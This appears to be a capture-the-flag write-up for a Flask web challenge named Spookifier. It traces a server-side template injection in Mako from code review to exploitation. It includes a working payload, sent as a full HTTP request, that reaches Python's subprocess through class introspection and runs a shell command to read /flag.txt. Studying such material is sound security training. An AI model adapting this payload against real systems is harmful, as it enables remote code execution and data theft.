# Spookifier

## Reviewing Configuration Files

- The Dockerfile gives us the dependencies of the webapplication
    - Flask 2.0.0
    - mako
        - https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/code-execution-via-ssti-python-mako/
        - https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/out-of-band-code-execution-via-ssti-python-mako/
        - https://portswigger.net/web-security/server-side-template-injection/exploiting
    - flask_mako
    - Werkzeug 2.0.0

## Architecture Review

- The architecture is a Flask web application. That means there are HTTP API endpoints. The route handlers exist in application/blueprints/routes and are bound in main.py. There is only a single route `/`

## Code Review

Starting from the entry point, we see that the URL endpoint takes a single GET parameter 'text':

```python
# application/blueprints/routes.py
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
    
    return render_template('index.html',output='')
```

From viewing the Dockerfile and looking at the imports, we know that the application is using something called [flask_mako](https://flask-mako.readthedocs.io/en/latest/). After reading the project page, we can deduce that flask_mako is a templating engine. Templating engines are typically susceptible to Server side template injections. A SSTI occurs when an attacker is able to use native template syntax to inject a malicoius payload into the template and obtain arbitrary code execution. 

After a quick Google, I find the following disclosures:

- https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/code-execution-via-ssti-python-mako/
- https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/out-of-band-code-execution-via-ssti-python-mako/

## Exploit Development

Ok, now that we know mako is susceptible to SSTI, lets attempt to detect an indication that this is exploitable. A go to way for testing for SSTI is to use `7*7` and detect whether the template engine evaluated the expression to 49. Not all template engines are the same though. They all use different syntaxes in order to know when to evaluate Python code. I started reading the documentation to [Flask-Mako](https://docs.makotemplates.org/en/latest/).

After a bit of reading, I found the syntax for expression evaluation. In mako, you use `${}` to evaluate Python3 directly. Lets try this in the web-app:

![spookifier-ssti-ioc.](/assets/htb/spookifier-ssti-ioc.png)

This web-application is in fact, vulnerable to a SSTI. 

Next, we need to craft a payload to perform arbitrary code exectuion so we can read the flag. 

```
GET /?text=${''.__class__.__mro__[1].__subclasses__()[280]('cat%20/flag.txt',shell=True,stdout=-1).communicate()} HTTP/1.1
Host: 94.237.62.181:58323
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://94.237.62.181:58323/?text=%7B%7B7*7%7D%7D
Upgrade-Insecure-Requests: 1


```


## References

- https://portswigger.net/web-security/server-side-template-injection#what-is-server-side-template-injection
- https://flask-mako.readthedocs.io/en/latest/
- https://docs.makotemplates.org/en/latest
- https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/code-execution-via-ssti-python-mako/
- https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/out-of-band-code-execution-via-ssti-python-mako/

- https://dr34mhacks.github.io/posts/how-to-exploit-ssti/